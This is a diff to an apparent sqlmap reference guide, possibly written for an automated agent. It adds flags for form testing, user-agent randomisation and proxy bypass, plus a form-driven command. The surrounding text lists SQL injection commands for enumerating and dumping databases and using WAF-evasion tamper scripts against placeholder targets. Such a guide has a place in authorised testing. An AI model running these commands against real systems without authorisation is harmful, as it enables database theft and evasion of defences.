@@ -21,9 +21,12 @@ High-signal flags:
 - `--risk <1-3>` payload risk profile
 - `--threads <n>` concurrency
 - `--technique <letters>` technique selection
+- `--forms` parse and test forms from target page
 - `--cookie <cookie>` and `--headers <headers>` authenticated context
 - `--timeout <seconds>` and `--retries <n>` transport stability
 - `--tamper <scripts>` WAF/input-filter evasion
+- `--random-agent` randomize user-agent
+- `--ignore-proxy` bypass configured proxy
 - `--dbs`, `-D <db> --tables`, `-D <db> -T <table> --columns`, `-D <db> -T <table> -C <cols> --dump`
 - `--flush-session` clear cached scan state
 
@@ -35,6 +38,8 @@ Common patterns:
   `sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5`
 - POST parameter testing:
   `sqlmap -u "https://target.tld/login" --data "user=admin&pass=test" -p pass --batch --level 2 --risk 1`
+- Form-driven testing:
+  `sqlmap -u "https://target.tld/login" --forms --batch --level 2 --risk 1 --random-agent`
 - Enumerate DBs:
   `sqlmap -u "https://target.tld/item?id=1" -p id --batch --dbs`
 - Enumerate tables in DB:
@@ -45,6 +50,7 @@ Common patterns:
 Critical correctness rules:
 - Always include `--batch` in automation to avoid interactive prompts.
 - Keep target parameter explicit with `-p` when possible.
+- Use `--flush-session` when retesting after request/profile changes.
 - Start conservative (`--level 1-2`, `--risk 1`) and escalate only when needed.
 
 Usage rules:
